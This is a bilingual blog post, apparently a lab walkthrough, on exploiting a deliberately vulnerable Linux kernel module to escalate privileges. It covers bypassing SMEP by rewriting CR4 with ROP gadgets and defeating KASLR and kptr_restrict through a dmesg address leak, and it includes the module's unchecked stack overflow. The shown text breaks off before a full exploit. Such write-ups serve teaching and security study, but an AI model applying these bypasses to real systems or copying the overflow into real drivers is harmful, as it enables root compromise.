<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="Let_go"><meta name="renderer" content="webkit"><meta name="copyright" content="Let_go"><meta name="keywords" content="Let_go"><meta name="description" content="null"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric · Mr.Chen's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Let_go</div><div class="profile-signature">人生如棋,我愿为卒。行动虽慢,可谁曾见我后退一步。</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Chen's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2018/03/12</span></span><span class="busuanzi-pv" id="busuanzi_container_page_pv"><i class="post-intro-calendar fa fa-user-o"></i><span id="busuanzi_value_page_pv"></span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="Exploit"> Exploit</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="Linux-Kernel-x86-64-bypass-SMEP-KASLR-kptr-restric"><a href="#Linux-Kernel-x86-64-bypass-SMEP-KASLR-kptr-restric" class="headerlink" title="Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric"></a>Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric</h1><hr>
<h3 id="Background-背景"><a href="#Background-背景" class="headerlink" title="Background(背景)"></a>Background(背景)</h3><p>Before to get into a genuine exploitation of a kernel vulnerable module，let’s see which protections we need to bypass<br>在深入了解内核易受攻击的某块之前，我们来看看需要绕过哪些保护机制</p>
<h3 id="SMEP（管理模式执行保护）"><a href="#SMEP（管理模式执行保护）" class="headerlink" title="SMEP（管理模式执行保护）"></a>SMEP（管理模式执行保护）</h3><p>SMEP stands for Supervisor Mode Execution Protection<br>SMEP代表管理模式执行保护<br>This kernel protection doesn’t allow a user space code to be executed by the kernel.<br>内核保护不允许内核执行用户态空间代码，<br>To check if SMEP is activated，we can simply read /porc/cpuinfo<br>要检查SMEP是否被激活，可以简单的阅读/proc/cpuinfo<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># cat /proc/cpuinfo | grep smep</span></div><div class="line">......</div><div class="line">flags        : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts nopl xtopology tsc_reliable nonstop_tsc aperfmperf eagerfpu pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm <span class="number">3</span>dnowprefetch epb fsgsbase tsc_adjust bmi1 hle avx2 smep bmi2 invpcid rtm rdseed adx smap xsaveopt xsavec xgetbv1 dtherm ida arat pln pts hwp hwp_notify hwp_act_window hwp_epp</div><div class="line">.....</div></pre></td></tr></table></figure></p>
<p>SMEP is the 20th bit of the CR4 register<br>SMEP是CR4寄存器中的第20位：<br><img src="smep.png" alt=""></p>
<h3 id="KASLR-内核地址空间随机布局"><a href="#KASLR-内核地址空间随机布局" class="headerlink" title="KASLR(内核地址空间随机布局)"></a>KASLR(内核地址空间随机布局)</h3><p>KASLR stands for Kernel Address Space Layout Randomization.<br>KASLR代表内核地址空间随机化布局<br>It aims to make some kernel exploits more difficult to implement by randomizing the base address value of the kernel（boot time）<br>它指通过随机化内核的基地址值来使一些内核漏洞更难利用（开机时间）<br>Exploits that rely on the locations of internal symbols must discover the randomized base address<br>依靠内部内核符号位置的漏洞必须发现随机化的基地址</p>
<h3 id="Kernel-Address-Display-Restriction（内核地址显示限制）"><a href="#Kernel-Address-Display-Restriction（内核地址显示限制）" class="headerlink" title="Kernel Address Display Restriction（内核地址显示限制）"></a>Kernel Address Display Restriction（内核地址显示限制）</h3><p>kptr_restrict indicates if restrictions are placed on exposing kernel addresses via/proc and other interfaces<br>kptr_restrict指示是否限制通过/proc和其他接口公开内核地址</p>
<ol>
<li>the default,there are no restrictions.（默认情况下,没有任何限制）</li>
<li>kernel pointers printed using the %pK format speciffier will be replaced with o’s unless the user has CAP_SYSLOG.（除非用户具有CAP_SYSLOG功能，否则使用%pK格式说明符打印的指针将会被替换为0）</li>
<li>kernel pointers printed using %pK will be replaced with o’s regardless of privileges.（无论权限如何，使用%pK打印的内核指针将被替换为0）<br>In other words，we can’t get commit_creds addr just by reading the /proc/kallsyms:<br>换句话说，我们不能通过阅读/proc/kallsyms来获取commit_creds addr:<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># cat /proc/kallsyms | grep commit_creds</span></div><div class="line"><span class="number">0000000000000000</span> T commit_creds</div></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Privilege-escalation（特权升级）"><a href="#Privilege-escalation（特权升级）" class="headerlink" title="Privilege escalation（特权升级）"></a>Privilege escalation（特权升级）</h3><p>As always，our goal is to get the top privilege and for that，we just need to execute the following<br>与往常一样，我们的目标是获取最高权限，为此只想执行以下操作<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>))</div></pre></td></tr></table></figure></p>
<h3 id="Get-back-to-user-land（返回用户位置）"><a href="#Get-back-to-user-land（返回用户位置）" class="headerlink" title="Get back to user land（返回用户位置）"></a>Get back to user land（返回用户位置）</h3><p>Even if we can bypass SMEP，we can’t just try to execute /bin/sh in our user code.We need to go back to user land correctly<br>即使我们可以绕过SMEP，我们也不能试图在我们的用户代码中执行/bin/sh。我们需要正确地返回到用户位置</p>
<p>This can be done with two gadgets：<br>这可以使用两个gadget完成<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">swapgs</div><div class="line">iretq</div></pre></td></tr></table></figure></p>
<p>Followed by this structure：（紧随其后的是这种结构）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">the next RIP</div><div class="line">user land CS</div><div class="line">user land EFLAGS</div><div class="line">user land RSP</div><div class="line">user land SS</div></pre></td></tr></table></figure></p>
<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>测试代码：<a href="https://github.com/black-bunny/LinKern-x86_64-bypass-SMEP-KASLR-kptr_restric">https://github.com/black-bunny/LinKern-x86_64-bypass-SMEP-KASLR-kptr_restric</a></p>
<h3 id="Vulnerable-module"><a href="#Vulnerable-module" class="headerlink" title="Vulnerable module"></a>Vulnerable module</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/version.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kdev_t.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></div><div class="line"><span class="keyword">static</span> <span class="keyword">dev_t</span> first; <span class="comment">// Global variable for the first device number </span></div><div class="line"><span class="keyword">static</span> <span class="keyword">struct</span> cdev c_dev; <span class="comment">// Global variable for the character device structure </span></div><div class="line"><span class="keyword">static</span> <span class="keyword">struct</span> <span class="keyword">class</span> *cl; <span class="comment">// Global variable for the device class </span></div><div class="line"><span class="keyword">static</span> <span class="keyword">char</span> *buffer_var;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">vuln_open</span><span class="params">(<span class="keyword">struct</span> inode *i, <span class="keyword">struct</span> file *f)</span></span></div><div class="line">&#123;</div><div class="line">       printk(KERN_INFO <span class="string">"[i] Module vuln: open()\n"</span>);</div><div class="line">       <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">vuln_close</span><span class="params">(<span class="keyword">struct</span> inode *i, <span class="keyword">struct</span> file *f)</span></span></div><div class="line">&#123;</div><div class="line">       printk(KERN_INFO <span class="string">"[i] Module vuln: close()\n"</span>);</div><div class="line">       <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">static</span> ssize_t <span class="title">vuln_read</span><span class="params">(<span class="keyword">struct</span> file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></div><div class="line">&#123;</div><div class="line">       <span class="keyword">if</span> (<span class="built_in">strlen</span>(buffer_var) &gt; <span class="number">0</span>) &#123;</div><div class="line">              printk(KERN_INFO <span class="string">"[i] Module vuln read: %s\n"</span>, buffer_var);</div><div class="line">              kfree(buffer_var);</div><div class="line">              buffer_var = kmalloc(<span class="number">100</span>, GFP_DMA);</div><div class="line">              <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">       &#125;</div><div class="line">       <span class="keyword">else</span> &#123;</div><div class="line">              <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">       &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">static</span> ssize_t <span class="title">vuln_write</span><span class="params">(<span class="keyword">struct</span> file *f, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></div><div class="line">&#123;</div><div class="line">       <span class="keyword">char</span> buffer[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">       <span class="keyword">if</span> (_copy_from_user(buffer, buf, len))</div><div class="line">              <span class="keyword">return</span> -EFAULT;</div><div class="line">       buffer[len - <span class="number">1</span>] = <span class="string">'\0'</span>;</div><div class="line">       printk(<span class="string">"[i] Module vuln write: %s\n"</span>, buffer);</div><div class="line">       <span class="built_in">strncpy</span>(buffer_var, buffer, len);</div><div class="line">       <span class="keyword">return</span> len;</div><div class="line">&#125;</div><div class="line"><span class="keyword">static</span> <span class="keyword">struct</span> file_operations pugs_fops =</div><div class="line">&#123;</div><div class="line">  .owner = THIS_MODULE,</div><div class="line">  .open = vuln_open,</div><div class="line">  .release = vuln_close,</div><div class="line">  .write = vuln_write,</div><div class="line">  .read = vuln_read</div><div class="line">&#125;;</div><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">vuln_init</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Constructor */</span></span></div><div class="line">&#123;</div><div class="line">       buffer_var = kmalloc(<span class="number">100</span>, GFP_DMA);</div><div class="line">       printk(KERN_INFO <span class="string">"[i] Module vuln registered"</span>);</div><div class="line">       <span class="keyword">if</span> (alloc_chrdev_region(&amp;first, <span class="number">0</span>, <span class="number">1</span>, <span class="string">"vuln"</span>) &lt; <span class="number">0</span>)</div><div class="line">       &#123;</div><div class="line">              <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">       &#125;</div><div class="line">       <span class="keyword">if</span> ((cl = class_create(THIS_MODULE, <span class="string">"chardrv"</span>)) == <span class="literal">NULL</span>)</div><div class="line">       &#123;</div><div class="line">              unregister_chrdev_region(first, <span class="number">1</span>);</div><div class="line">              <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">       &#125;</div><div class="line">       <span class="keyword">if</span> (device_create(cl, <span class="literal">NULL</span>, first, <span class="literal">NULL</span>, <span class="string">"vuln"</span>) == <span class="literal">NULL</span>)</div><div class="line">       &#123;</div><div class="line">              printk(KERN_INFO <span class="string">"[i] Module vuln error"</span>);</div><div class="line">              class_destroy(cl);</div><div class="line">              unregister_chrdev_region(first, <span class="number">1</span>);</div><div class="line">              <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">       &#125;</div><div class="line">       cdev_init(&amp;c_dev, &amp;pugs_fops);</div><div class="line">       <span class="keyword">if</span> (cdev_add(&amp;c_dev, first, <span class="number">1</span>) == <span class="number">-1</span>)</div><div class="line">       &#123;</div><div class="line">              device_destroy(cl, first);</div><div class="line">              class_destroy(cl);</div><div class="line">              unregister_chrdev_region(first, <span class="number">1</span>);</div><div class="line">              <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">       &#125;</div><div class="line">       printk(KERN_INFO <span class="string">"[i] &lt;Major, Minor&gt;: &lt;%d, %d&gt;\n"</span>, MAJOR(first), MINOR(first));</div><div class="line">       <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">vuln_exit</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Destructor */</span></span></div><div class="line">&#123;</div><div class="line">       unregister_chrdev_region(first, <span class="number">3</span>);</div><div class="line">       printk(KERN_INFO <span class="string">"Module vuln unregistered"</span>);</div><div class="line">&#125;</div><div class="line">module_init(vuln_init);</div><div class="line">module_exit(vuln_exit);</div><div class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</div><div class="line">MODULE_AUTHOR(<span class="string">"blackndoor"</span>);</div><div class="line">MODULE_DESCRIPTION(<span class="string">"Module vuln overflow"</span>);</div></pre></td></tr></table></figure>
<p>This really simple kernel module has a stack overflow in its function vuln_write( ) The datas’s lenght copied to the buffer variable isn’t checked<br>这个非常简单的内核模块在其函数vuln_write中存在栈溢出，未检查复制到缓冲区变量的数据长度</p>
<h3 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">~$ lsmod</div><div class="line">kmod <span class="number">16384</span> <span class="number">0</span> - Live <span class="number">0x0000000000000000</span> (O) &lt;= kptr_restrict</div><div class="line">~$ ls / dev</div><div class="line">console null ttyS0 vuln</div><div class="line">~$ cat / proc / kallsyms | grep commit_creds</div><div class="line"><span class="number">0000000000000000</span> T commit_creds &lt;= kptr_restrict</div><div class="line">~$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB &gt; / dev / vuln</div><div class="line">[<span class="number">28.965579</span>] general protection fault : <span class="number">0000</span>[#<span class="number">1</span>] SMP</div><div class="line">[<span class="number">28.967297</span>] Modules linked in : kmod(O)</div><div class="line">[<span class="number">28.968139</span>] CPU : <span class="number">0</span> PID : <span class="number">109</span> Comm : sh Tainted : G O <span class="number">4.8</span><span class="number">.0</span> #<span class="number">5</span></div><div class="line">[<span class="number">28.968139</span>] Hardware name : QEMU Standard PC(i440FX + PIIX, <span class="number">1996</span>), BIOS Ubuntu - <span class="number">1.8</span><span class="number">.2</span> - <span class="number">1u</span>buntu1 <span class="number">04</span> / <span class="number">01</span> / <span class="number">2014</span></div><div class="line">[<span class="number">28.968139</span>] task : ffff9f1fc2730000 task.<span class="built_in">stack</span> : ffff9f1fc2770000</div><div class="line">[<span class="number">28.968139</span>] RIP : <span class="number">0010</span> : [&lt; <span class="number">4242424242424242</span>&gt;] [&lt; <span class="number">4242424242424242</span>&gt;] <span class="number">0x4242424242424242</span></div><div class="line">...</div><div class="line">[<span class="number">28.968139</span>] CR2 : <span class="number">0000000000494b</span>0a CR3 : <span class="number">000000000272f</span>000 CR4 : <span class="number">00000000001006f</span>0 &lt;= SMEP</div><div class="line">...</div><div class="line">[<span class="number">28.968139</span>] Call Trace :</div><div class="line">[<span class="number">28.968139</span>] [&lt; ffffffffbb0c2a00&gt;] ? __init_waitqueue_head + <span class="number">0x10</span> / <span class="number">0x20</span></div><div class="line">...</div><div class="line">(restarted)</div><div class="line">~$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB &gt; / dev / vuln</div><div class="line">[<span class="number">112.990843</span>] general protection fault : <span class="number">0000</span>[#<span class="number">1</span>] SMP</div><div class="line">...</div><div class="line">[<span class="number">112.992198</span>] Call Trace :</div><div class="line">[<span class="number">112.992198</span>] [&lt; ffffffffba0c2a00&gt;] ? __init_waitqueue_head + <span class="number">0x10</span> / <span class="number">0x20</span> &lt;= KASLR</div></pre></td></tr></table></figure>
<p>In this analyse，we clearly see the protections（SMEP，KASLR and kptr_restrict）<br>在这个分析中，我们清晰看到 </p>
<h4 id="Bypass-SMEP"><a href="#Bypass-SMEP" class="headerlink" title="Bypass SMEP"></a>Bypass SMEP</h4><p>As explained before, SMEP doens’t allow the user space code to be executed by the kernel,so even if we control RIP，we can’t execute the user code right away：we can use a ROP explooit with kernel space addresses only or we can disable the SMEP’ bit<br>如前所述，SMEP不允许内核执行用户空间代码，所以即使我们控制RIP也是如此，我们不能立即执行用户代码：我们只能使用带有内核空间地址的ROP攻击，或者可以禁用SMEP位<br>SMEP is the 20th bit of the CR4 register which in our case is equal to：00000000000006f0<br>SMEP是CR4寄存器的第20位，我们这里的情况等于 CR4：00000000001006f0<br>    If we can get CR4 to be equal to：CR4：00000000000006f0<br>    如果我们可以得到CR4等于：CR4：00000000000006f0<br>    SMEP will be disabled.（SMEP将被禁用）<br>To do so，we can use two gadgets：<br>为此，我们可以使用两个gadgets<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POP RDI；RET <span class="comment">//place 00000000000006f0 in RDI</span></div><div class="line">MOV CR4，RDI；RET <span class="comment">// SMEP disabled!</span></div></pre></td></tr></table></figure></p>
<h4 id="Bypass-KASLR-and-kptr-restrict"><a href="#Bypass-KASLR-and-kptr-restrict" class="headerlink" title="Bypass KASLR and kptr_restrict"></a>Bypass KASLR and kptr_restrict</h4><p>The goal of these bypasses is to find a kernel space address,and add to it an offset to retrieve the gadgets/address needed.We found one usefull address in the result of the dmesg command:<br>这些绕过的目标是找到一个内核空间地址，并添加一个偏移量来检索所需要的gadgets/address。我们在dmesg命令的结果中找到了一个有用的地址：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">~$ dmesg</div><div class="line">[0.000000] Linux version 4.8.0 (root@pc1001) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0 - 6ubuntu1~16.04.2)) #5 SMP Sat Oct 8 10:01 : 18 CEST 2016</div><div class="line">[0.000000] Command line : console = ttyS0 loglevel = 3 oops = panic panic = 1</div><div class="line">[0.000000] KERNEL supported cpus :</div><div class="line">[0.000000]   Intel GenuineIntel</div><div class="line">[0.000000]   AMD AuthenticAMD</div><div class="line">[0.000000]   Centaur CentaurHauls</div><div class="line">[0.000000] x86 / fpu : Legacy x87 FPU detected.</div><div class="line">[0.000000] x86 / fpu : Using 'eager' FPU context switches.</div><div class="line">[0.000000] e820 : BIOS - provided physical RAM map :</div><div class="line">[0.000000] BIOS - e820 : [mem 0x0000000000000000 - 0x000000000009fbff] usable</div><div class="line">...</div><div class="line">[0.221392] Freeing SMP alternatives memory : 24K(ffffffffafea9000 - ffffffffafeaf000)</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>This is good but we still need to find offsets that we will add or substract to the address we found in order to get gadgets(for instance”pop gadget” or commit_creds address).<br>这很好，但我们仍然需要找到offset 我们将添加或减去我们找到的地址以获取gadgets（例如”pop gadget”或commit_creds address）。<br>We need to find the same kernel as the one used in the exercice with KASLR OFF and kptr_restrict set to 0，to be able to find our offsets.<br>我们需要找到一些内核，如和练习中KASLR OFF和kptr_restrict设置为0一样的那种，以便我们能够找到偏移量</p>
<p>For this purpose，let’s first see the kernel used by the system：<br>为此，我们先看看系统使用的内核<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">~$ uname - a</div><div class="line">Linux(none) 4.8.0 #5 SMP Sat Oct 8 10:01 : 18 CEST 2016 x86_ 64 GNU/Linux</div></pre></td></tr></table></figure></p>
<p>We download the kernel 4.8.0 from kernel.org and compile it with KASLR OFF.<br>我们从kernel.org下载内核4.8.0并使用KASLR OFF进行编译。<br>Then，we disable kptr_restric which is set in the “init” file. To do so we extract the file’s structure from initramfs.img<br>然后 我们禁用在’init’文件中设置的kptr_restric。为此，我们从initramfs.img中提取文件的结构<br>gzip -dcS .img initramfs.img | cpio -id</p>
<p>We comment the 13th line:<br>我们注意第13行<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#!/bin/sh</div><div class="line">chown root:root /root </div><div class="line">chown root:root /root<span class="comment">/* </span></div><div class="line">chmod 600 /root/flag </div><div class="line">mknod -m 0666 /dev/null c 1 3 </div><div class="line">mknod -m 0660 /dev/ttyS0 c 4 64</div><div class="line">mount -t proc proc /proc </div><div class="line">mount -t sysfs sysfs /sys</div><div class="line"># restriction kallsyms</div><div class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict &lt;= comment this line </div><div class="line">insmod /kmod.ko </div><div class="line">mknod /dev/vuln c 247 0 </div><div class="line">chmod a+rw /dev/vuln</div><div class="line">setsid cttyhack setuidgid 1000 sh</div><div class="line">umount /proc </div><div class="line">umount /sys</div><div class="line">poweroff -f</div></pre></td></tr></table></figure></p>
<p>and we recreate the file’s structure：<br>我们重新创建文件的结构：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . | cpio -H newc -o | gzip &gt; ../initramfs.img</div></pre></td></tr></table></figure></p>
